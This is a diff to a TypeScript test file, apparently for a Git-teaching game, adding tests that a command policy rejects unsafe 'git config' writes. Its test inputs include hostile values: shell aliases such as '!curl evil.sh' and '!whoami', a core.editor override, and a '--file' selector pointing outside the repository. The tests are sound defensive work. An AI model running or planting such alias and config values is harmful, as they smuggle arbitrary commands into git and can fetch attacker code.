@@ -8,6 +8,10 @@ import {
 import { parseGitCommand } from "../../src/git/command_parser";
 
 const STAGING_POLICY: CapabilityPolicy = { commands: ["status", "diff", "add"] };
+const CONFIG_POLICY: CapabilityPolicy = {
+  commands: ["config", "status", "log"],
+  config: { allowedKeys: ["alias.st", "user.name"], allowedScopes: ["global"] },
+};
 
 describe("enforcePolicy", () => {
   test("允许关卡开放的命令", () => {
@@ -59,6 +63,30 @@ describe("enforcePolicy", () => {
   test("拒绝 shell alias 配置", () => {
     expect(() =>
       enforcePolicy(parseGitCommand("git config alias.pwn=!curl evil.sh"), OPEN_POLICY),
+    ).toThrow(PolicyViolation);
+  });
+
+  test("拒绝分离参数形式的 shell alias", () => {
+    expect(() =>
+      enforcePolicy(parseGitCommand('git config --global alias.st "!whoami"'), CONFIG_POLICY),
+    ).toThrow(PolicyViolation);
+  });
+
+  test("别名只能指向当前关卡允许的真实 Git 子命令", () => {
+    expect(() =>
+      enforcePolicy(parseGitCommand("git config --global alias.st status"), CONFIG_POLICY),
+    ).not.toThrow();
+    expect(() =>
+      enforcePolicy(parseGitCommand("git config --global alias.st push"), CONFIG_POLICY),
+    ).toThrow(PolicyViolation);
+  });
+
+  test("拒绝白名单外的配置写入与文件选择器", () => {
+    expect(() =>
+      enforcePolicy(parseGitCommand("git config --global core.editor evil"), CONFIG_POLICY),
+    ).toThrow(PolicyViolation);
+    expect(() =>
+      enforcePolicy(parseGitCommand("git config --file=outside user.name learner"), CONFIG_POLICY),
     ).toThrow(PolicyViolation);
   });
 
